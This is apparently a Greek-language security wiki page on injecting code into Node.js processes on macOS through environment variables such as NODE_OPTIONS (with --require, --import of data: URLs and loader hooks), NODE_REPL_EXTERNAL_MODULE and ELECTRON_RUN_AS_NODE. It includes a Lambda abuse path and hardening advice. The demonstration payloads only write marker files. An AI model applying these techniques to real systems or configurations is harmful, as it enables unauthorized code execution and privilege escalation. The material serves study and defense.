# Injection σε εφαρμογές Node.js στο macOS

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Αν ένας attacker μπορεί να ελέγξει το environment μιας process που τελικά εκκινεί το **Node.js** (το binary `node` απευθείας ή οποιοδήποτε Node-based CLI, όπως τα `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), αρκετές environment variables κάνουν το runtime να **φορτώνει και να εκτελεί JavaScript υπό τον έλεγχο του attacker πριν εκτελεστεί το target program**. Αυτό αποτελεί primitive για code execution, ισοδύναμο με τις οικογένειες `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` για άλλα runtimes.

Ο preloaded κώδικας εκτελείται **στην ίδια process** με το ίδιο uid, environment, file descriptors και entitlements όπως το victim, επομένως αποτελεί καθαρό vector για injection/priv-esc κάθε φορά που μια process με περισσότερα privileges εκκινεί το Node με inherited ή επηρεασμένο από τον attacker environment.

## `NODE_OPTIONS` — `--require` (file-backed)

Το `NODE_OPTIONS` αναλύεται σαν να περιείχε επιπλέον command-line flags. Το `--require` (`-r`) κάνει preload ένα CommonJS module **πριν** από το entry point, επομένως ο top-level κώδικάς του εκτελείται πρώτος.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` με URL `data:` (χωρίς αρχείο)

Από το **Node 20.6**, το `--import` αποδέχεται ένα URL `data:text/javascript,<code>`, επιτρέποντάς σας να προφορτώνετε JavaScript ES-module **inline, χωρίς αρχείο στον δίσκο και χωρίς κατάλογο module**. Ο κώδικας πρέπει να είναι **πλήρως URL-encoded** (ένα μη κωδικοποιημένο κενό ή `#` περικόπτει το data URL και προκαλεί `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
Αυτή είναι η τεχνική που γίνεται abuse στο cloud, π.χ. με την εισαγωγή του `NODE_OPTIONS` στη configuration μιας AWS Lambda function (`lambda:UpdateFunctionConfiguration`, χωρίς να απαιτείται `iam:PassRole`), ώστε να εκτελείται code με το execution role.

> [!TIP]
> Το `NODE_OPTIONS` **δεν μπορεί** να εκτελέσει code απευθείας: flags όπως τα `--eval`/`-e`, `-p` ή ένα script path απορρίπτονται ρητά (`node: --eval is not allowed in NODE_OPTIONS`). Χρησιμοποιήστε τα `--require`/`--import` για να δείξετε σε code.

## `NODE_OPTIONS` — custom loaders / άλλα startup flags

Το `NODE_OPTIONS` λαμβάνει επίσης υπόψη άλλα startup-affecting flags των οποίων το side effect είναι η εκτέλεση attacker code, για παράδειγμα ένα ESM loader hook:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Οποιοσδήποτε launcher βασίζεται στο Node και εκκινεί ένα child `node` συνήθως **μεταβιβάζει το `NODE_OPTIONS`**, επομένως η έγχυσή του μία φορά μπορεί να επηρεάσει ολόκληρη την αλυσίδα εργαλείων (`npm run …`, `npx`, build tools, test runners, language servers).

## `NODE_REPL_EXTERNAL_MODULE`

Όταν το Node εκκινεί ένα **interactive REPL**, φορτώνει το module που καθορίζεται από το `NODE_REPL_EXTERNAL_MODULE`, εκτελώντας τον κώδικα ανώτατου επιπέδου του. Αυτό είναι χρήσιμο όταν ο στόχος εκκινεί ένα interactive `node`/`node -i` shell (εργαλεία ανάπτυξης, maintenance consoles).<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> Το `NODE_REPL_EXTERNAL_MODULE` αγνοείται σκόπιμα όταν χρησιμοποιείται η προστασία [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) για την εκκίνηση ενός child, αλλά ένα REPL που εκκινείται απευθείας το τιμά.

## Electron (`ELECTRON_RUN_AS_NODE`)

Οι εφαρμογές Electron επανεκθέτουν το πλήρες Node runtime όταν εκκινούν με **`ELECTRON_RUN_AS_NODE=1`**, οπότε όλα τα παραπάνω vectors του `NODE_OPTIONS` εφαρμόζονται στο (συχνά signed/entitled) binary του Electron. Δείτε:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Άλλα JS runtimes

- Το **Bun** διαβάζει το `NODE_OPTIONS` για compatibility και υποστηρίζει το δικό του `--preload` (ρυθμιζόμενο μέσω του `bunfig.toml`).
- Το **Deno** δεν τιμά το `NODE_OPTIONS`· απαιτεί explicit flags (`--import`, `--preload`), επομένως δεν είναι ευάλωτο σε inherited `NODE_OPTIONS`.

Επιβεβαιώνετε πάντα το ακριβές runtime και version, καθώς τα αποδεκτά flags αλλάζουν μεταξύ releases.

## Ενίσχυση ασφάλειας

- Αφαιρείτε τα `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` και `ELECTRON_RUN_AS_NODE` από το environment πριν από την εκκίνηση του Node από πιο privileged context· εκκινείτε child processes με sanitized environment.
- Αντιμετωπίζετε τη δυνατότητα ορισμού του environment ενός target (config injection, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, CI variables, Lambda/container config) ως ισοδύναμη με code execution σε οποιοδήποτε Node process εκκινεί.
- Παρακολουθείτε το process exec για αυτές τις variables με τον ίδιο τρόπο που το [Shield](https://github.com/theevilbit/Shield) εμφανίζει alerts για το `ELECTRON_RUN_AS_NODE` και τις μεταβλητές dyld injection.

## References

- [1] [Τεκμηρίωση Node.js CLI — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` και URLs `data:`](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
